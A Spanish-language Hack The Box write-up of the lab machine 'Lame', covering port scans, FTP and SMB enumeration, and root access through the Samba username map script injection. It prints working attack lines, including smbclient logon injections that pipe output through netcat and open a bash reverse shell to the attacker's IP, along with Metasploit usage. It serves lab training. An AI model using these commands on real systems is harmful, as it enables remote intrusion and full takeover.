---
layout: single
title: Lame - Hack The Box
excerpt: "La máquina lame es una de las primeras maquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una maquina super fácil, ya que lo único que haremos será utilizar el servicio Samba para poder obtener acceso a la máquina."
date: 2023-01-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/lame_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Samba
  - FTP
  - Backdoor Command Execution - CVE-2011-2523
  - Username Map Script - CVE-2007-2447
  - Command Injection
  - OSCP Style
  - Metasploit
---

![](/assets/images/htb-writeup-lame/lame_logo.png)

La máquina lame es una de las primeras maquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una maquina super fácil, ya que lo único que haremos será utilizar el servicio Samba para poder obtener acceso a la máquina.

## Traza ICMP
Para comenzar, debemos saber si la maquina está conectada o no. Para esto lanzamos una traza ICMP que no es más que enviar paquetes de datos con la finalidad de que lleguen a un destino, si se pierden es que la maquina no está conectada, pero si llegan, entonces podemos empezar.
```
ping -c 4 10.10.10.3                  
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=128 ms
64 bytes from 10.10.10.3: icmp_seq=2 ttl=63 time=129 ms
64 bytes from 10.10.10.3: icmp_seq=3 ttl=63 time=129 ms
64 bytes from 10.10.10.3: icmp_seq=4 ttl=63 time=132 ms

--- 10.10.10.3 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 128.329/129.436/131.846/1.404 ms
```
Lanzamos 4 paquetes, entonces podemos iniciar la penetración.

## Escaneo de Puertos
Vamos a realizar un escaneo de los puertos que tenga abiertos la máquina, este escaneo lo guardaremos en un fichero grepeable para poder analizarlo mejor. Una vez obtenidos los puertos haremos un escaneo de servicios.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-11 13:59 CST
Initiating SYN Stealth Scan at 13:59
Scanning 10.10.10.3 [65535 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Increasing send delay for 10.10.10.3 from 0 to 5 due to 11 out of 21 dropped probes since last increase.
Completed SYN Stealth Scan at 14:00, 31.35s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.97s latency).
Scanned at 2023-01-11 13:59:43 CST for 31s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 37 (1.628KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.

* --open: Para indicar que aplique el escaneo en los puertos abiertos.

* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.

* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).

* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.

* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.

* -Pn: Para indicar que se omita el descubrimiento de hosts.

* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

## Escaneo de Servicios
Analizando el escaneo de servicios, observamos que hay 3 servicios que nos interesan. El primero es el servicio FTP ya que podemos loguearnos como anonymous, el servicio ssh aunque de momento no tenemos ningún usuario ni credencial y el servicio Samba aunque lo vemos en 2 puertos, el que nos interesa más será el puerto 445.
```
nmap -sC -sV -p21,22,139,445,3632
Nmap 7.93 scan initiated Wed Jan 11 14:10:38 2023 as: nmap -sC -sV -p21,22,139,445,3632 -oN targeted 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.14s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m20s, deviation: 3h32m11s, median: 17s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-01-11T15:11:14-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Wed Jan 11 14:11:32 2023 -- 1 IP address (1 host up) scanned in 54.32 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

## Analizando el Servicio FTP
Entraremos a este servicio como usuario anonymous, para ver que podemos encontrar que nos pueda ser util.
```
ftp 10.10.10.3 
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:berserkwings): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14331|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||47187|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
221 Goodbye
```
Nada, no hay nada que podamos usar. Así que vamos a intentar probar si podemos subir archivos:
```
ftp> put /etc/passwd
local: /etc/passwd remote: /etc/passwd
229 Entering Extended Passive Mode (|||15322|).
553 Could not create file.
```
No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque quizá hay un exploit que podamos usar aquí.

## Buscando un Exploit para el Servicio FTP
Recordemos que tenemos la versión del servicio FTP de la máquina víctima, por lo que podemos investigar si hay un exploit que nos sirva para vulnerar dicha máquina.

```
searchsploit vsftpd 2.3.4  
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                       | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                          | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Encontramos un exploit creado en python, vamos a analizarlo, utiliza el comando `searchsploit -x unix/remote/49757.py` para analizar el exploit:

```
signal(SIGINT, handler)
parser=argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()
host = args.host
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()

```
* Searchsploit -x: Para ver el exploit.
* Searchsploit -m: Para copiar el exploit.

Lo que hace este exploit es tratar de conectarnos al servicio FTP a través del puerto 6200 (o eso entiendo), pero no creo que funcione porque dicho puerto no está abierto, así que no perdamos tiempo y mejor analicemos el servicio Samba.

## Analizando el Servicio Samba
Ahora nos logueamos en el Samba para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.

Primero vamos a tratar de mostrar los recursos compartidos que estén a nivel de red, para ver si hay algo útil.
```
smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
* -L: Sirve para listar los recursos compartidos.

* -N: Sirve para que no nos pida usuario y contraseña para logearnos, osea un Null Session.

Observamos ahí algo curioso en el recurso TMP, puede que ahí tengamos algo que nos ayude así que vamos a logearnos directamente ahí:
```
smbclient //10.10.10.3/tmp -N                                  
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 16 15:48:12 2023
  ..                                 DR        0  Sat Oct 31 00:33:58 2020
  .ICE-unix                          DH        0  Thu Mar 16 13:56:55 2023
  vmware-root                        DR        0  Thu Mar 16 13:57:22 2023
  .X11-unix                          DH        0  Thu Mar 16 13:57:22 2023
  .X0-lock                           HR       11  Thu Mar 16 13:57:22 2023
  vgauthsvclog.txt.0                  R     1600  Thu Mar 16 13:56:53 2023
  5567.jsvc_up                        R        0  Thu Mar 16 13:57:59 2023

                7282168 blocks of size 1024. 5386560 blocks available
smb: \> 
```
Pues no veo nada útil, bueno que yo sepa ahí no nos sirve algo, así que mejor vamos a buscar un exploit que no ayude aquí.

## Buscando, Analizando y Probando un Exploit para Samba
Como mencione anteriormente como no encontramos mucho aquí lo que podemos hacer es buscar un exploit que nos ayude.
```
searchsploit Samba 3.0.20      
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                   | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Vamos a analizar el exploit que esta hecho en ruby, ósea el **Username Map Script**. El exploit es usado en **Metasploit** de forma automatizada pero analicemos cual es el exploit que usa. Recuerda usar el comando **searchsploit -x** para analizar el exploit.

```
def exploit

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end
```
Quizá podamos usar esta parte **username = "/=`nohup " + payload.encoded + "`"**  para poder ganar acceso. Para intentar loguearnos usaremos el comando logon que nos pide un usuario y contraseña para ver si podemos inyectar código.

Levantamos un tcpdump para capturar los paquetes lanzados por traza ICMP:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
Desde el servidor Samba mandamos la traza:
```
smb: \> logon "/=`nohup ping 10.10.14.8`"
Password: 
```
Resultado:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:31:22.510983 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 1, length 64
14:31:22.510993 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 1, length 64
14:31:23.517887 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 2, length 64
14:31:23.517925 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 2, length 64
14:31:24.516644 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 3, length 64
14:31:24.516654 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 3, length 64
14:31:25.516771 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 4, length 64
14:31:25.516781 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```
Esto quiere decir que si podemos inyectar comandos, hagamos otra prueba. Esta vez, alzaremos una netcat para probar si podemos conectar una terminal bash.
```
nc -lvnp 443           
listening on [any] 443 ...
```
Inyectando comando, desde la sesión de Samba:
```
smb: \> logon "/=`nohup whoami | nc 10.10.14.8 443`"
Password: 

```
Resultado en la netcat:
```
nc -lvnp 443           
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 32800
root
```

## Accediendo a la Máquina
Como ya vimos en las pruebas anteriores, podemos tratar de conectar una terminal bash a la máquina víctima, así que alzaremos una netcat y veremos si podemos activarla.
```
logon "/=`nohup nc -e /bin/bash 10.10.14.8 443`"
Password:

```

EUREKA!!!
```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 57427
whoami
root
script /dev/null -c bash
root@lame:/#
```
OJO: Lo que sigue es opcional, pero lo recomiendo para que la terminal sea más interactiva.

Presionamos crtl + Z para suspender la sesión del netcat. Y aplicamos el siguiente comando:
```
stty raw -echo; fg                                                                                            
[1]  + continued  nc -lvnp 443
```
Y solamente escribimos "reset xterm" para que se resetee la terminal y ya aparezca la terminal bash más interactiva.
```
tty raw -echo; fg                                                                                            
[1]  + continued  nc -lvnp 443
Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
root@lame:/# whoami
root
root@lame:/# ls  
bin    etc         initrd.img.old  mnt        root  tmp      vmlinuz.old
boot   home        lib             nohup.out  sbin  usr
cdrom  initrd      lost+found      opt        srv   var
dev    initrd.img  media           proc       sys   vmlinu
```
Ahora solamente buscamos la flag del root y del usuario:
```
root@lame:/# find \-name user.txt
./home/makis/user.txt
root@lame:/# cat ./home/makis/user.txt

root@lame:/# find \-name root.txt
./root/root.txt
root@lame:/# cat ./root/root.txt
```
Y listo ya quedo esta máquina al estilo OSCP.

# Metasploit
Con esta madre es super sencillo y ps casi no aprendes ni papa pero aun así por si lo quieren probar, así se usa:

## Activando Metaspploit
Para comenzar a usar Metasploit primero debemos iniciar la base de datos de este:
```
msfdb start                                                                      
[+] Starting database
```
Y ya podemos iniciar la consola interactiva de Metasploit:
```
msfconsole 
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                     
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                     
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                     
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                     
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                     
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                     
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                     
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
```
## Usando Metasploit
Una vez activado tan simple como lo habíamos hecho antes, buscamos el servicio para ver si hay un exploit y lo usamos:
```
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
```
Para usarlo solamente escribimos el nombre y el comando **use**:
```
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) >
```
Para ver cómo usarlo, usamos el comando show options:

```
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
Solamente cambiamos lo que nos pide, que sería el RHOST, LHOST y el LPORT:
```
msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3

msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.8
LHOST => 10.10.14.8

msf6 exploit(multi/samba/usermap_script) > set LPORT 443
LPORT => 443
```
Y ahora si para terminar solo damos en exploit y aplicara todo el proceso:
```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.8:443 
[*] Command shell session 1 opened (10.10.14.8:443 -> 10.10.10.3:48482) at 2023-03-16 16:07:21 -0600

whoami
root
script /dev/null -c bash
root@lame:/# whoami
root
root@lame:/# id
uid=0(root) gid=0(root)
root@lame:/# exit
exit
```
Antes de terminar todo, salimos con exit y debemos apagar la base de datos de Metasploit:
```
root@lame:/# exit
exit
Script started, file is /dev/null
Script started, file is /dev/null
Script done, file is /dev/null
^C
Abort session 1? [y/N]  y

[*] 10.10.10.3 - Command shell session 1 closed.  Reason: User exit
msf6 exploit(multi/samba/usermap_script) > exit
                                                                                                                                                  
┌──(root㉿kali)-[/home/…/Retired_Easy_machines/Lame/OSCP_Style/nmap]
└─# msfdb stop 
[+] Stopping database
```
# FIN
